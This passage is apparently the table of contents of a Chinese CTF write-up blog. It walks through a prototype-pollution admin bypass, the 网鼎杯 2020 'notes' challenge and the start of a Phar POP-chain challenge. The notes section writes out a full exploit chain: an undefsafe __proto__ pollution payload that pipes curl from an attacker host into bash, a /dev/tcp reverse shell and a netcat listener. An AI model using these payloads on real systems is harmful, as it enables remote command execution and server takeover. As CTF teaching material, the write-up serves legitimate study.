Admin选项试试吧，先试试能不能用sql注入的永真绕过邀请码，然后发现不行（这个注册环境甚至没有数据库），然后发现这个题学姐给我们题型了，反序列化或者原型链污染，反序列化肯定不太可能，这黑盒环境反序列化有点抽象了，所以猜测是原型链污染（又是完全陌生的一个名词），所以就去了解一下这个漏洞吧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E4%BD%93%E4%BA%86%E8%A7%A3%E5%8E%9F%E7%90%86%E5%90%8E%E5%B0%B1%E6%9D%A5%E5%B0%9D%E8%AF%95%E4%B8%80%E4%B8%8B%E5%81%9A%E9%A2%98%E5%90%A7%EF%BC%8C%E9%A6%96%E5%85%88%E4%BE%BF%E6%98%AF%E8%A6%81%E5%BC%84%E6%B8%85%E6%A5%9A%E6%88%91%E4%BB%AC%E8%A6%81%E6%B1%A1%E6%9F%93%E7%9A%84%E8%BF%99%E4%B8%AA%E5%85%83%E7%B4%A0%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E6%98%BE%E8%80%8C%E6%98%93%E8%A7%81%E5%B0%B1%E6%98%AF%E5%88%A4%E5%AE%9A%E6%88%91%E4%BB%AC%E6%98%AF%E4%B8%8D%E6%98%AFis-Admin%E7%9A%84%E8%BF%99%E4%B8%AA%E5%8F%82%E6%95%B0%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8E%BBBP%E6%8A%93%E4%B8%AA%E5%8C%85%E7%9C%8B%E7%9C%8B%E8%BF%99%E4%B8%AA%E5%8F%82%E6%95%B0%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%98%AF%E2%80%9DisAdmin%E2%80%9D-true"><span class="toc-number">13.0.4.</span> <span class="toc-text">大体了解原理后就来尝试一下做题吧，首先便是要弄清楚我们要污染的这个元素是什么，显而易见就是判定我们是不是is Admin的这个参数了，所以去BP抓个包看看这个参数是什么，原来是”isAdmin”:true</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E6%8A%8A%E8%BF%99%E4%B8%AA%E5%8F%82%E6%95%B0%E6%94%BE%E5%88%B0%E5%8E%9F%E5%9E%8B%E9%87%8C%E9%9D%A2%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%85%83%E7%B4%A0%E6%94%BE%E8%BF%9B-proto-isAdmin-true-%E9%87%8C%EF%BC%88%E4%B8%80%E5%AE%9A%E8%A6%81%E8%AE%B0%E5%BE%97%E5%88%A0%E6%8E%89%E5%8E%9F%E5%85%88post%E8%AF%B7%E6%B1%82%E7%9A%84%E2%80%9DisAdmin%E2%80%9D-true%E5%90%8E%E9%9D%A2%E7%9A%84-%EF%BC%89%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B0%B1%E4%BC%9A%E5%B0%86%E5%B0%86%E8%BF%99%E4%B8%AA%E5%8F%82%E6%95%B0%E5%88%A4%E6%96%AD%E4%B8%BA%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%8C%E5%9C%A8%E8%AF%BB%E5%8F%96%E6%97%B6%E4%BE%BF%E4%BC%9A%E9%81%8D%E5%8E%86%E6%89%80%E6%9C%89%E9%93%BE%E5%8E%BB%E6%89%BE%E5%88%B0isAdmin%E8%BF%99%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%9C%A8%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%E6%97%B6%E4%BE%BF%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%B6%8A%E6%9D%83%E6%8B%BF%E5%88%B0Admin%E7%9A%84%E6%9D%83%E9%99%90%E7%BA%A7%E5%88%AB%E4%BA%86"><span class="toc-number">13.0.5.</span> <span class="toc-text">所以把这个参数放到原型里面，也就是在这个元素放进__proto__:{&quot;isAdmin&quot;:true}里（一定要记得删掉原先post请求的”isAdmin”:true后面的,），这样服务器就会将将这个参数判断为原型链的一部分，在读取时便会遍历所有链去找到isAdmin这个参数，这样在注册账号时便可以直接越权拿到Admin的权限级别了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%BF%87%E7%9B%B4%E6%8E%A5%E6%8F%90%E4%BA%A4%E8%AF%B7%E6%B1%82%E6%8A%A5%E9%94%99%EF%BC%8C%E5%B0%9D%E8%AF%95%E5%90%8E%E5%8F%91%E7%8E%B0%E6%98%AF%E6%88%91%E4%BB%AC%E8%BF%98%E6%B2%A1%E6%9C%89%E6%8A%8A%E7%A7%98%E9%92%A5%E8%BF%99%E4%B8%AA%E5%8F%82%E6%95%B0%E5%8E%BB%E6%8E%89%EF%BC%8C%E5%8E%BB%E6%8E%89%E4%B9%8B%E5%90%8E%E8%BE%B9%E6%88%90%E5%8A%9F%E6%B3%A8%E5%86%8C%E4%BA%86"><span class="toc-number">13.0.6.</span> <span class="toc-text">不过直接提交请求报错，尝试后发现是我们还没有把秘钥这个参数去掉，去掉之后边成功注册了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E7%99%BB%E5%BD%95%E5%8F%91%E7%8E%B0%E9%A1%B5%E9%9D%A2%E9%87%8C%E7%9A%84flag%E6%9E%9C%E7%84%B6%E5%8F%91%E7%94%9F%E5%8F%98%E5%8C%96%EF%BC%88%E5%90%8C%E6%97%B6wife%E2%80%93%EF%BC%89%EF%BC%8C%E6%8F%90%E4%BA%A4%E5%90%8E%E6%9E%9C%E7%84%B6%E6%98%AF%E7%9C%9Fflag%E3%80%82"><span class="toc-number">13.0.7.</span> <span class="toc-text">然后登录发现页面里的flag果然发生变化（同时wife–），提交后果然是真flag。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes"><span class="toc-number">14.</span> <span class="toc-text">[网鼎杯 2020 青龙组]notes</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%99%E4%BA%86%E7%8E%AF%E5%A2%83%E5%92%8C%E9%99%84%E4%BB%B6%EF%BC%8C%E9%99%84%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%B8%8B%E6%9D%A5%E5%90%8E%E5%8F%91%E7%8E%B0%E6%98%AF%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%AE%A1%E8%AE%A1%E4%BA%86%E4%B8%80%E4%B8%8B%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E5%B0%B1%E6%98%AF%E4%B8%80%E4%BA%9B%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%95%B0%E6%8D%AE%E7%9A%84%E6%93%8D%E4%BD%9C%E5%88%86%E5%B8%83%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%BD%91%E9%A1%B5%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%9C%89%E4%B8%80%E6%AE%B5%E4%BB%A3%E7%A0%81%E6%84%9F%E8%A7%89%E6%9C%89%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%8F%AF%E8%83%BD"><span class="toc-number">14.0.1.</span> <span class="toc-text">题目给了环境和附件，附件下载下来后发现是源代码，审计了一下之后发现就是一些增删改查数据的操作分布在不同网页，不过有一段代码感觉有漏洞利用的可能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%80%E6%AE%B5-exec-commands-index-shell-bin-bash-%EF%BC%8C%E5%A4%A7%E4%BD%93%E6%84%8F%E6%80%9D%E5%B0%B1%E6%98%AF%E6%89%A7%E8%A1%8Cindex%E8%BF%99%E4%B8%AA%E5%8F%98%E9%87%8F%E4%BB%A3%E6%8C%87%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%90%8C%E6%97%B6index%E5%8F%88%E6%98%AF%E4%BB%8Ecommands%E9%87%8C%E9%9D%A2%E9%81%8D%E5%8E%86%EF%BC%8C%E8%BF%99%E5%B0%B1%E8%AE%A9%E5%88%9A%E5%88%9A%E5%81%9A%E5%AE%8C%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E7%9A%84%E6%88%91%E6%84%9F%E8%A7%89%E5%A6%82%E6%9E%9C%E8%83%BD%E6%B1%A1%E6%9F%93commands%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%EF%BC%8C%E4%B8%8D%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%BA%86%E5%90%97%E3%80%82"><span class="toc-number">14.0.2.</span> <span class="toc-text">这里面有一段 exec(commands[index], {shell:&#39;&#x2F;bin&#x2F;bash&#39;}，大体意思就是执行index这个变量代指的命令，同时index又是从commands里面遍历，这就让刚刚做完原型链污染的我感觉如果能污染commands的原型链，不就可以进行任意代码执行了吗。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E6%98%AF%E6%80%8E%E4%B9%88%E6%B1%A1%E6%9F%93%E7%9A%84%E9%97%AE%E9%A2%98%E4%BA%86%EF%BC%8C%E9%97%AE%E9%A2%98%E6%98%AF%E6%88%91%E4%BB%AC%E8%83%BD%E8%BE%93%E5%85%A5%E7%9A%84%E6%AF%94%E5%A6%82%E8%BE%93%E5%85%A5%E6%95%B0%E6%8D%AE%E5%92%8C%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E9%83%BD%E6%98%AF%E5%9C%A8note-list%E8%BF%99%E4%B8%AA%E7%B1%BB%E9%87%8C%E9%9D%A2%E4%BF%AE%E6%94%B9%EF%BC%8C%E8%B7%9Fcommands%E8%BF%99%E4%B8%AA%E7%B1%BB%E6%89%AF%E4%B8%8D%E4%B8%8A%E5%8D%8A%E7%82%B9%E5%85%B3%E7%B3%BB"><span class="toc-number">14.0.3.</span> <span class="toc-text">接下来就是怎么污染的问题了，问题是我们能输入的比如输入数据和修改数据都是在note_list这个类里面修改，跟commands这个类扯不上半点关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E5%90%8E%E5%8F%91%E7%8E%B0%E8%BF%98%E6%9C%89undefsafe%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%A5%E9%85%8D%E5%90%88%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E8%BE%BE%E5%88%B0%E6%B1%A1%E6%9F%93%E6%89%80%E6%9C%89%E9%93%BE%E7%9A%84%E6%95%88%E6%9E%9C"><span class="toc-number">14.0.4.</span> <span class="toc-text">了解后发现还有undefsafe函数的漏洞可以配合原型链污染达到污染所有链的效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E7%9B%B4%E6%8E%A5%E5%B0%86id%E8%AE%BE%E7%BD%AE%E4%B8%BA-proto-%E8%BF%99%E6%A0%B7%E8%BD%AC%E5%85%A5%E6%95%B0%E6%8D%AE%E5%90%8E%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%B0%86%E6%89%80%E6%9C%89%E9%93%BE%E7%9A%84-proto-author%E9%83%BD%E8%B5%8B%E5%80%BC%E4%B8%BAauthor%EF%BC%88raw%E5%90%8C%E7%90%86%EF%BC%89%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E5%86%8D%E5%9C%A8author%E8%BF%99%E4%B8%AA%E5%85%83%E7%B4%A0%E9%87%8C%E9%9D%A2%E5%86%99%E5%85%A5%E6%88%91%E4%BB%AC%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%91%BD%E4%BB%A4%E4%B8%8D%E5%B0%B1%E8%83%BD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BA%86%E5%90%97"><span class="toc-number">14.0.5.</span> <span class="toc-text">这里直接将id设置为__proto__,这样转入数据后就可以将所有链的__proto__.author都赋值为author（raw同理），这样我们再在author这个元素里面写入我们要执行的命令不就能命令执行了吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%BF%87%E7%9B%B4%E6%8E%A5%E4%BC%A0%E5%85%A5%E5%83%8Fls%E8%BF%99%E6%A0%B7%E7%9A%84%E5%91%BD%E4%BB%A4%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%8C%E5%88%A4%E6%96%AD%E5%8F%AF%E8%83%BD%E6%98%AF%E6%B2%A1%E6%9C%89%E6%89%93%E5%8D%B0%E5%9B%9E%E6%98%BE%E5%88%B0%E7%BD%91%E9%A1%B5%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%B8%80%E5%BC%80%E5%A7%8B%E6%88%91%E4%BB%A5%E4%B8%BAconsole-log%E5%B0%B1%E6%98%AF%E7%9B%B4%E6%8E%A5%E8%BE%93%E5%87%BA%EF%BC%8C%E6%9F%A5%E8%AF%A2%E4%B9%8B%E5%90%8E%E6%89%8D%E7%9F%A5%E9%81%93%E8%BF%99%E5%8F%AA%E6%98%AF%E4%B8%AA%E7%94%A8%E4%BA%8E%E8%B0%83%E8%AF%95%E5%92%8C%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%B8%8D%E4%BC%9A%E8%BE%93%E5%87%BA%E5%88%B0%E7%BD%91%E9%A1%B5%E7%AB%AF%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9A%84%E8%AF%9D%E5%8F%88%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%E5%91%A2"><span class="toc-number">14.0.6.</span> <span class="toc-text">不过直接传入像ls这样的命令并没有回显，判断可能是没有打印回显到网页的命令，一开始我以为console.log就是直接输出，查询之后才知道这只是个用于调试和查看程序运行过程中的数据的命令，不会输出到网页端，这样的话又该怎么办呢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9C%8B%E4%BA%86%E5%88%AB%E4%BA%BA%E7%9A%84WP%E5%8F%91%E7%8E%B0%E8%BF%98%E5%8F%AF%E4%BB%A5%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E5%8F%8D%E5%BC%B9-shell-%E6%98%AF%E6%8C%87%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%BB%E5%8A%A8%E5%90%91%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E4%B8%BB%E6%9C%BA%E5%8F%91%E8%B5%B7%E8%BF%9E%E6%8E%A5%EF%BC%8C%E7%84%B6%E5%90%8E%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%AA%E8%BF%9E%E6%8E%A5%E4%B8%8E%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E8%BF%9B%E8%A1%8C%E4%BA%A4%E4%BA%92%E3%80%82%E4%B8%8E%E4%B9%8B%E7%9B%B8%E5%AF%B9%E7%9A%84%E6%98%AF%E7%BB%91%E5%AE%9A-shell%EF%BC%8C%E5%AE%83%E6%98%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%8A%E5%BC%80%E6%94%BE%E4%B8%80%E4%B8%AA%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E7%9B%B4%E6%8E%A5%E8%BF%9E%E6%8E%A5%E8%BF%99%E4%B8%AA%E7%AB%AF%E5%8F%A3%E3%80%82%EF%BC%89"><span class="toc-number">14.0.7.</span> <span class="toc-text">看了别人的WP发现还可以反弹shell（反弹 shell 是指目标主机主动向攻击者的主机发起连接，然后攻击者利用这个连接与目标主机进行交互。与之相对的是绑定 shell，它是在目标主机上开放一个监听端口，攻击者直接连接这个端口。）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%9D%A5%E5%86%99%E5%85%A5shell%E8%BF%9B%E8%A1%8C%E7%9B%91%E5%90%AC%E7%9B%AE%E6%A0%87%EF%BC%8C%E5%88%A9%E7%94%A8Curl%E9%85%8D%E5%90%88Bash%E5%8F%8D%E5%BC%B9shell%EF%BC%8C%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E5%85%88%E6%9C%89%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84VPS%EF%BC%88%E8%99%9A%E6%8B%9F%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89%EF%BC%88%E5%A5%BD%E5%83%8F%E5%BF%85%E9%A1%BB%E8%A6%81%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E6%88%91%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%8E%A5%E6%94%B6%E4%B8%8D%E5%88%B0shell%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9C%A8%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%94%BE%E4%B8%80%E4%B8%AAshell-txt%E6%96%87%E4%BB%B6%EF%BC%8C%E5%9C%A8%E9%87%8C%E9%9D%A2%E5%86%99%E4%B8%8ABash%E5%91%BD%E4%BB%A4bash-i-dev-tcp-IP-9999-0-1-IP%E8%A6%81%E5%86%99%E6%88%91%E4%BB%AC%E8%BF%9B%E8%A1%8C%E7%9B%91%E5%90%AC%E7%9A%84IP%EF%BC%8C%E7%AB%AF%E5%8F%A39999%E5%8F%AF%E4%BB%A5%E7%94%A8%E8%87%AA%E5%B7%B1%E5%96%9C%E6%AC%A2%E7%9A%84"><span class="toc-number">14.0.8.</span> <span class="toc-text">这里我们就可以利用我们可以控制命令执行来写入shell进行监听目标，利用Curl配合Bash反弹shell，首先我们先有一个自己的VPS（虚拟服务器）（好像必须要云服务器，我的本地接收不到shell），然后在网站目录下放一个shell.txt文件，在里面写上Bash命令bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;9999 0&gt;&amp;1(IP要写我们进行监听的IP，端口9999可以用自己喜欢的)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E7%94%A8netcat%E8%BF%9B%E8%A1%8C%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A39999-nc-lvvp-9999-%EF%BC%8C%E6%9C%80%E5%90%8E%E5%9C%A8%E9%A2%98%E7%9B%AE%E7%BD%91%E7%AB%99%E4%B8%AD%E7%9A%84edit-note%E9%A1%B5%E9%9D%A2POST%E6%88%91%E4%BB%AC%E7%9A%84%E6%95%B0%E6%8D%AEid-proto-author-curl-20http-IP-shell-txt-bash-raw-a-%E5%8E%9F%E7%90%86%E5%B0%B1%E6%98%AF%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%B6%E5%88%A9%E7%94%A8linux%E7%9A%84%E9%80%9A%E9%81%93-%E6%9D%A5%E5%B0%86%E8%AE%BF%E9%97%AE%E6%88%91%E4%BB%AC%E7%BD%91%E9%A1%B5%E9%87%8C%E9%9D%A2%E7%9A%84shell-txt%E8%8E%B7%E5%BE%97%E7%9A%84%E4%BF%A1%E6%81%AF%E9%80%9A%E8%BF%87%E7%AE%A1%E9%81%93-%E4%BC%A0%E5%85%A5bash%E4%B8%AD%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%BE%BE%E5%88%B0%E8%AE%A9bash%E6%89%A7%E8%A1%8C%E8%BF%9E%E6%8E%A5%E5%88%B0%E6%88%91%E4%BB%AC%E8%AE%BE%E5%AE%9A%E7%9A%84ip%E4%B8%8B%E7%9A%84%E7%AB%AF%E5%8F%A3%E7%9A%84%E5%91%BD%E4%BB%A4%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%88%91%E4%BB%AC%E5%B0%B1%E8%83%BD%E8%BF%9B%E8%A1%8C%E7%9B%91%E5%90%AC%E5%92%8C%E5%AF%B9%E6%96%B9%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8B%E7%9A%84%E7%9B%B4%E6%8E%A5%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BA%86-%EF%BC%8C%E4%B9%8B%E5%90%8E%E5%A4%A7%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E9%83%BD%E4%BC%9A%E6%8A%A5%E9%94%99%EF%BC%8C%E8%BF%99%E9%87%8C%E5%BA%94%E8%AF%A5%E6%98%AF%E6%88%91%E4%BB%AC%E7%BB%99%E6%89%80%E6%9C%89%E7%B1%BB%E9%83%BD%E6%B1%A1%E6%9F%93%E5%AF%BC%E8%87%B4%E7%9A%84%EF%BC%8C%E4%B8%8D%E7%94%A8%E7%90%86%E4%BC%9A%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%8E%BB%E8%AE%BF%E9%97%AE-status%E8%AE%A9%E6%88%91%E4%BB%AC%E6%B3%A8%E5%85%A5%E7%9A%84%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E5%B0%B1%E5%A5%BD%E4%BA%86"><span class="toc-number">14.0.9.</span> <span class="toc-text">然后用netcat进行监听端口9999(nc -lvvp 9999)，最后在题目网站中的edit_note页面POST我们的数据id&#x3D;__proto__&amp;author&#x3D;curl%20http:&#x2F;&#x2F;IP&#x2F;shell.txt|bash&amp;raw&#x3D;a(原理就是在命令执行时利用linux的通道|来将访问我们网页里面的shell.txt获得的信息通过管道|传入bash中，从而达到让bash执行连接到我们设定的ip下的端口的命令，这样我们就能进行监听和对方服务器下的直接的命令执行了)，之后大部分页面都会报错，这里应该是我们给所有类都污染导致的，不用理会，直接去访问&#x2F;status让我们注入的代码运行就好了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B9%8B%E5%90%8E%E5%B0%B1%E5%8E%BB%E6%8B%BFflag%E5%8D%B3%E5%8F%AF"><span class="toc-number">14.0.10.</span> <span class="toc-text">之后就去拿flag即可</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PharPOP"><span class="toc-number">15.</span> <span class="toc-text">PharPOP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%83%AF%E4%BE%8B%E5%85%88%E6%89%BE%E6%89%BE%E8%B5%B7%E7%82%B9%EF%BC%88%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95destruct%E5%92%8Cwakeup%EF%BC%89%E5%92%8C%E7%BB%88%E7%82%B9%EF%BC%88include%E7%AD%89%E5%8F%AF%E6%8E%A7%E5%88%B6%E5%8F%82%E6%95%B0%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%EF%BC%89%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%91%E7%8E%B0air%E7%B1%BB%E4%B8%AD%E6%9C%89%E4%B8%80%E5%8F%A5echo-new-p-value-%EF%BC%88%E5%8E%9F%E7%94%9F%E7%B1%BB%EF%BC%8C%E5%90%8E%E9%9D%A2%E5%86%8D%E8%AF%B4%EF%BC%89%EF%BC%8C%E5%90%8C%E6%97%B6%E8%BF%99%E9%87%8C%E5%9C%A8D%E8%BF%99%E4%B8%AA%E7%B1%BB%E9%87%8C%E9%9D%A2%E5%8F%91%E7%8E%B0%E4%BA%86%E4%B8%A4%E4%B8%AA%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0file-put-contents%E5%92%8Cfile-get-contents%E5%B0%B1%E5%9C%A8destruct%E9%87%8C%E9%9D%A2%EF%BC%8C%E5%8F%AF%E6%83%9C%E6%9C%89waf%E5%87%BD%E6%95%B0%E5%AF%B9%E5%8F%82%E6%95%B0data%E7%9A%84%E8%BF%87%E6%BB%A4%E8%AE%A9%E6%88%91%E4%BB%AC%E9%9A%BE%E4%BB%A5%E7%9B%B4%E5%87%BB%E5%88%B0flag%EF%BC%8Cwaf%E8%BF%87%E6%BB%A4%E6%8E%89%E4%BA%86%E5%BE%88%E5%A4%9A%E5%8D%8F%E8%AE%AE%E5%92%8Cphp%EF%BC%8C%E8%AE%A9%E6%88%91%E4%BB%AC%E6%97%A0%E6%B3%95%E7%9B%B4%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E4%B8%8A%E4%BC%A0shell%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%B1%E8%A6%81%E7%94%A8%E5%88%B0%E6%88%91%E4%BB%AC%E9%A2%98%E7%9B%AE%E7%9A%84%E6%8F%90%E7%A4%BAphar%E4%BA%86%E3%80%82"><span class="toc-number">15.0.1.</span> <span class="toc-text">首先，反序列化惯例先找找起点（魔术方法destruct和wakeup）和终点（include等可控制参数的危险函数），我们发现air类中有一句echo new $p($value)（原生类，后面再说），同时这里在D这个类里面发现了两个危险函数file_put_contents和file_get_contents就在destruct里面，可惜有waf函数对参数data的过滤让我们难以直击到flag，waf过滤掉了很多协议和php，让我们无法直接远程文件包含和上传shell，这里就要用到我们题目的提示phar了。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%82%A3%E4%B9%88%E8%BF%99%E4%B8%AA%E9%A2%98%E6%88%91%E4%BB%AC%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8phar%E4%BD%9C%E4%B8%BA%E8%B7%B3%E6%9D%BF%E5%91%A2%EF%BC%8C%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BA%E4%B8%BB%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E5%8F%82%E6%95%B0%E7%9A%84%E9%95%BF%E5%BA%A6%E6%9C%89%E9%99%90%E5%88%B6%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%83%B3%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8echo-new-p-value-%E7%9A%84%E8%AF%9D%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E5%B5%8C%E5%A5%97%E7%B1%BB%E7%9A%84%E7%94%9F%E6%88%90%EF%BC%8C%E4%BC%9A%E8%B6%85%E5%87%BA%E9%95%BF%E5%BA%A6%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E5%88%A9%E7%94%A8phar%E4%BD%9C%E4%B8%BA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%B7%B3%E6%9D%BF%EF%BC%8C%E5%88%A9%E7%94%A8file-put-contents%E5%86%99%E5%85%A5phar%EF%BC%8C%E5%88%A9%E7%94%A8file-get-contents%E8%A7%A6%E5%8F%91%E5%88%A9%E7%94%A8echo-new-p-value-%E7%9A%84pop%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">15.0.2.</span> <span class="toc-text">那么这个题我们为什么要用phar作为跳板呢，这是因为主函数的反序列化对参数的长度有限制，如果想直接利用echo new $p($value)的话需要进行嵌套类的生成，会超出长度，所以我们要利用phar作为反序列化的跳板，利用file_put_contents写入phar，利用file_get_contents触发利用echo new $p($value)的pop链反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%BF%87%E5%9C%A8%E5%B0%9D%E8%AF%95%E6%80%A7%E4%BC%A0%E5%85%A5%E5%87%A0%E4%B8%AA%E5%8F%82%E6%95%B0%E6%97%B6%E5%8F%91%E7%8E%B0%E7%BD%91%E9%A1%B5%E6%9C%80%E5%90%8E%E4%B8%80%E7%9B%B4%E6%8A%A5%E9%94%99%EF%BC%8C%E8%BF%99%E6%89%8D%E6%B3%A8%E6%84%8F%E5%88%B0%E6%9C%80%E5%90%8E%E7%9A%84%E4%B8%80%E5%8F%A5throw-new-Error-%E2%80%9Cstart%E2%80%9D-%EF%BC%8C%E8%BF%99%E5%8F%A5%E8%AF%9D%E7%9A%84%E4%BD%9C%E7%94%A8%E5%B0%B1%E6%98%AF%E6%8A%9B%E5%87%BA%E4%B8%80%E4%B8%AA%E9%94%99%E8%AF%AF%EF%BC%8C%E8%80%8C%E4%BB%A3%E7%A0%81%E5%9C%A8%E9%81%87%E5%88%B0%E8%BF%99%E4%B8%AA%E9%94%99%E8%AF%AF%E6%97%B6%E4%BE%BF%E4%B8%8D%E5%86%8D%E8%BF%9B%E8%A1%8C%EF%BC%8C%E8%BF%9B%E8%80%8C%E5%AF%BC%E8%87%B4%E6%88%91%E4%BB%AC%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E